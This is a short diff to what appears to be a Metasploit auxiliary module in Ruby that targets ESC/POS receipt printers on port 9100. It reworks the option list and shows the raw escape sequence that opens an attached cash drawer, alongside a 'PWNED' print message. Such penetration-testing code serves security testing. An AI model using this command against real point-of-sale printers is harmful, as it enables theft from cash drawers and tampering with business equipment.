@@ -21,16 +21,15 @@ class MetasploitModule < Msf::Auxiliary
       
     ))
 
-    register_options(
+        register_options(
           [
-            Opt::RPORT(9100),                                  # Default printer port
-            OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']), conditions: %w[PRINT_MESSAGE]),
+            Opt::RPORT(9100),
+            OptString.new('MESSAGE', [true, 'Message to print', 'PWNED'], conditions: %w[PRINT_MESSAGE]),
             OptBool.new('TRIGGER_DRAWER', [false, 'Trigger the attached cash drawer', false]),
             OptBool.new('PRINT_MESSAGE', [false, 'Print the specified message', false]),
-            OptInt.new('DRAWER_COUNT', [true, 'Number of times to trigger the drawer', 2])
           ]
         )
-  end
+      end
 
   # ESC/POS command to trigger the cash drawer
   DRAWER_COMMAND = "\x1b\x70\x00\x19\x32".freeze
